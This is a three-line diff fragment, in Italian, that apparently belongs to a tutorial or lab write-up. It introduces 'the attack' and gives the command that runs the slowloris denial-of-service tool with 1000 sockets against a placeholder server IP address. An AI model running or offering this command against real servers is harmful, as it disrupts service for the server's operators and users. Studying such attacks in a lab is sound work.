@@ -1,0 +1,3 @@
+Per eseguire l'attacco, utilizziamo il seguente comando
+python3 slowloris.py -s 1000 -v [Indirizzo IP del server]
+
